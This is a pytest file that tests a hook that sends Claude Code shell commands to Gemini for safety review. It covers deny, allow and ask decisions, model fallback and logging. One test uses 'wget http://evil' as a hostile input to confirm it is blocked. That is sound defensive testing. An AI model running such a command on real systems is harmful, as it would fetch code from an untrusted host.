"""Tests for .claude/hooks/gemini-api-bash-review.py (Gemini-only review)."""

from urllib.error import URLError

from conftest import fake_gemini, hook_payload

HOOK = ".claude/hooks/gemini-api-bash-review.py"


class TestPreDecisions:
    def test_deny_command_is_blocked_without_review(self, run_hook):
        res = run_hook(HOOK, hook_payload("wget http://evil"))
        assert res.exit_code == 0
        assert res.decision == "deny"
        assert "wget" in res.reason

    def test_safe_command_skips_review(self, run_hook):
        res = run_hook(HOOK, hook_payload("git diff --stat"))
        assert res.decision == "allow"
        assert "skipped Gemini review" in res.reason

    def test_missing_api_key_asks_user(self, run_hook):
        res = run_hook(HOOK, hook_payload("make deploy"), env={"GEMINI_API_KEY": None})
        assert res.decision == "ask"
        assert "GEMINI_API_KEY not set" in res.reason


class TestVerdictMapping:
    def test_allow(self, run_hook):
        res = run_hook(HOOK, hook_payload("make build"), urlopen=fake_gemini("ALLOW"))
        assert res.decision == "allow"
        assert "Gemini reviewed and approved" in res.reason

    def test_ask(self, run_hook):
        res = run_hook(HOOK, hook_payload("make build"), urlopen=fake_gemini("ASK"))
        assert res.decision == "ask"
        assert "Gemini requires confirmation" in res.reason

    def test_deny(self, run_hook):
        res = run_hook(
            HOOK,
            hook_payload("make build"),
            urlopen=fake_gemini("DENY: destroys data"),
        )
        assert res.decision == "deny"
        assert "DENY: destroys data" in res.reason

    def test_unparseable_output_defaults_to_ask(self, run_hook):
        res = run_hook(HOOK, hook_payload("make build"), urlopen=fake_gemini("no idea"))
        assert res.decision == "ask"


class TestApiFallback:
    def test_primary_failure_uses_fallback_model(self, run_hook):
        calls = []
        res = run_hook(
            HOOK,
            hook_payload("make build"),
            urlopen=fake_gemini(URLError("primary down"), "ALLOW", calls=calls),
        )
        assert res.decision == "allow"
        assert len(calls) == 2
        assert "primary-model" in calls[0].full_url
        assert "fallback-model" in calls[1].full_url

    def test_both_models_failing_asks_user(self, run_hook):
        res = run_hook(
            HOOK,
            hook_payload("make build"),
            urlopen=fake_gemini(URLError("down")),
        )
        assert res.exit_code == 0
        assert res.decision == "ask"
        assert "Gemini API error" in res.reason


class TestLogs:
    def test_summary_log_written(self, run_hook):
        res = run_hook(HOOK, hook_payload("ls -la"))
        summary = res.home / ".claude/logs/gemini-bash-review.log"
        assert "safe command" in summary.read_text(encoding="utf-8")
